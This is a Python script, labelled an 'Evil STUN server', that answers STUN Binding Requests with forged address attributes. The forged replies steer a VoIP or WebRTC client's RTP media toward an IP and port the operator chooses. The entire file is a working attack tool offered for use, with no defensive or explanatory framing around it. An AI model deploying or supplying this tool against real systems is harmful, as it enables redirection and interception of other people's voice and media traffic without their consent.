import socket
import argparse
import binascii
import sys
import os

parser = argparse.ArgumentParser(
    description="Evil STUN server"
)

parser.add_argument(
    '--stunip',
    dest="STUNIP",
    type=str,
    help="IP address of the evil stun server"
)

parser.add_argument(
    '--stunport',
    dest="STUNPORT",
    type=int,
    default=3478,
    help="Port of the evil stun server (default = 3478)"
)

parser.add_argument(
    '--rtpip',
    dest="RTPIP",
    type=str,
    help="IP address of RTP destination"
)

parser.add_argument(
    '--rtpport',
    dest="RTPPORT",
    type=int,
    default=16000,
    help="Port of the RTP destination (default = 16000)"
)

args = parser.parse_args()


def stunserver():
    print("\033[1;34m[*]\033[0m Waiting for incomming STUN requests")
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    soc.bind((args.STUNIP, args.STUNPORT))
    while True:
        try:
            data, addr = soc.recvfrom(1024)
            print("Request from " + str(addr))
            
            if b'\x00\x01' == data[:2]:
                print("Message Type: Binding Request")
                print("Message Length: " + str(data[2:4]))
                print("Message Transaction ID: " + str(binascii.hexlify(data[4:20])))
                print("Attribute Type: " + str(data[20:22]))
                print("\n\n")

                trans_id = (data[4:20])
                rtpip_bytes = bytes(map(int, args.RTPIP.split('.')))
                response = (b'\x01\x01\x00\x18' + trans_id + b'\x00\x01\x00\x08\x00\x01' + args.RTPPORT.to_bytes(2, 'big') + rtpip_bytes +  
                    b'\x00\x05\x00\x08\x00\x01' + args.RTPPORT.to_bytes(2, 'big') + rtpip_bytes)

                soc.sendto(response, addr)

            else:
                print("Request is not a STUN Binding Request\n\n")

        except (KeyboardInterrupt):
            print("\033[1;34m[*]\033[0m User interruption. Exiting ...")
            sys.exit(0)


stunserver()

